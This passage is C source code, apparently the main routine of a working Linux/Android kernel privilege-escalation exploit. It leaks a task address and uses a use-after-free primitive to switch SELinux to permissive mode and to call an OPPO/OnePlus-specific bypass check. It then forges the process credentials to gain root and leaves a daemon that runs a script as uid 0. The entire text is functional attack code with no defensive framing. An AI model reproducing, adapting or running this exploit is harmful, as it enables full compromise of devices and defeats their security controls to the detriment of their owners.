		g_shift = (unsigned)atoi(argv[1]);
	sigaction(SIGALRM, &action, NULL);
	ipc = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (ipc == MAP_FAILED)
		return 1;
	memset(ipc, 0, sizeof(*ipc));
	if (pin_cpu(0))
		return 1;
	g_ctx = calloc(MAX_RINGS, sizeof(*g_ctx));
	if (!g_ctx)
		return 1;
	dprintf(STDOUT_FILENO, "[id] uid=%u euid=%u gid=%u\n",
		getuid(), geteuid(), getgid());
	crash_log("[crash] start slide=%#" PRIx64 " page=%#" PRIx64 " split_node=%d\n",
	     g_slide, g_page_offset, g_cred_split_node);
	read_enforce();
	g_nrings = 0;
	if (write_file(TRACE "/buffer_size_kb", "16384\n"))
		dprintf(STDOUT_FILENO, "[warn] buffer_size_kb not writable, continuing\n");
	if (leak_task()) {
		dprintf(STDOUT_FILENO, "[task] leak failed\n");
		disarm();
		return 5;
	}
	g_plant_cred = 0;
	{
		uint64_t sel = slide_addr(SELINUX_LINK) - 7;
		int sel_off = 0;
		if (enforce_is_permissive()) {
			dprintf(STDOUT_FILENO, "[selinux] already permissive\n");
			sel_off = 1;
		} else {
			for (int i = 1; i <= 12 && !sel_off; i++) {
				dprintf(STDOUT_FILENO,
					"[selinux] attempt %d/12 target=%#" PRIx64 "\n",
					i, sel);
				if (!one_uaf(sel))
					sel_off = 1;
			}
		}
		if (sel_off) {
			dprintf(STDOUT_FILENO, "[GHOSTKEY] SELINUX IS NOW PERMISSIVE (enforcing=0)\n");
			log_sync();
			{
				int bypass_rc = check_oplus_device_bypass();
				dprintf(STDOUT_FILENO, "[oplus] bypass rc=%d\n", bypass_rc);
			}
			log_sync();
		} else {
			dprintf(STDOUT_FILENO, "[selinux] write failed after 12 attempts, keep enforcing\n");
		}
	}
	g_plant_cred = 1;
	int rooted = 0;
	for (int attempt = 1; attempt <= 12 && !rooted; attempt++) {
		unsigned uid = 1, euid = 1;
		int fixed_uid = -1, fixed_suid = -1;
		dprintf(STDOUT_FILENO, "[cred] plant attempt %d/12\n", attempt);
		crash_log("[crash] attempt %d task=%#" PRIx64 "\n", attempt, g_task);
		g_plant_cred = 1;
		if (one_uaf(0))
			continue;
		g_plant_cred = 0;
		dprintf(STDOUT_FILENO, "[cred] installed at %#" PRIx64 "\n", g_cred_kva);
		log_sync();
		crash_log("[crash] installed at %#" PRIx64 "\n", g_cred_kva);
		log_proc_uid(g_cred_child_pid);
		/*
		 * split 模式：rb_erase 装好 task->cred 之后，__rb_change_child 会顺手
		 * 把 &task->cred 写到 cred+8（gid/suid）；cred+16（sgid/euid）本来就是 0，
		 * 留着这一轮做兜底。
		 * overlap 模式：cred+16 写的是 cred[2]=&task->cred（suid/sgid），必须修。
		 */
		for (int i = 0; i < 3 && fixed_uid; i++)
			fixed_uid = one_uaf(g_cred_kva + 8);
		crash_log("[crash] fixuid=%d\n", fixed_uid);
		for (int i = 0; i < 3 && fixed_suid; i++)
			fixed_suid = one_uaf(g_cred_kva + 16);
		crash_log("[crash] fixsuid=%d\n", fixed_suid);
		if (ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0)
			rooted = 1;
		else if (uid == 1 && euid == 1)
			dprintf(STDOUT_FILENO, "[cred] child did not answer\n");
		else
			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
	}
	if (!rooted) {
		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
		for (;;)
			pause();
	}
	dprintf(STDOUT_FILENO, "[cred] child=%d holding pages (parent pid=%d)\n",
		g_cred_child_pid, getpid());
	dprintf(STDOUT_FILENO, "skroot_cve98260_pid=%d\n", g_cred_child_pid);
	log_sync();
	/*
	 * Two exit models.
	 *
	 * --daemon-exit (the one to use): tell the cred child the exploit is done.
	 * It releases the script runner (which execs g_root_script_path as uid 0), then
	 * parks holding the forged-cred pages with stdio on /dev/null. This process
	 * returns immediately.
	 *
	 * Without the flag: stay resident and wait for the child (reference
	 * implementation behaviour), which means the script is never released.
	 */
	if (daemon_exit) {
		unsigned char daemon_cmd = 0xAA;
		if (write(g_wake[1], &daemon_cmd, 1) == 1) {
			dprintf(STDOUT_FILENO, "[cred] sent daemon command to child\n");
			log_sync();
			char ack[32];
			ssize_t got = read(g_report[0], ack, sizeof(ack) - 1);
			if (got > 0) {
				ack[got] = 0;
				dprintf(STDOUT_FILENO, "[cred] child ack: %s", ack);
			}
			close(g_wake[1]);
			close(g_report[0]);
			dprintf(STDOUT_FILENO,
				"[cred] main process exiting, child becomes daemon\n");
			return 0;
		}
		dprintf(STDOUT_FILENO, "[cred] failed to send daemon command\n");
	}
	int ticks = 0;
	for (;;) {
		int status = 0;
		pid_t done = waitpid(g_cred_child_pid, &status, WNOHANG);
		if (done == g_cred_child_pid) {
			dprintf(STDOUT_FILENO,
				"[cred] child exited (status=%d), releasing pages\n",
				status);
			break;
		}
		if (done < 0 && errno != EINTR) {
			dprintf(STDOUT_FILENO, "[cred] waitpid failed errno=%d\n", errno);
			break;
		}
		/* Heartbeat: proves on the next device run whether this loop is alive
		 * and whether the child holding the pages is still running. */
		if (++ticks % 5 == 0) {
			char alive = (kill(g_cred_child_pid, 0) == 0) ? '1' : '0';
			/* ticks are 200ms each, so one second is ticks/5. The old
			 * "ticks * 5" label overstated elapsed time by 25x and made the
			 * device log read "25 s" after roughly one real second. */
			dprintf(STDOUT_FILENO,
				"[cred] waiting for child %d (alive=%c) %ds\n",
				g_cred_child_pid, alive, ticks / 5);
		}
		struct timespec nap = { .tv_sec = 0, .tv_nsec = 200000000L };
		nanosleep(&nap, NULL);
	}
	free_aio_hold();
	close_stream();
	dprintf(STDOUT_FILENO, "[uaf] exploit finished, exiting cleanly\n");
	return 0;
}
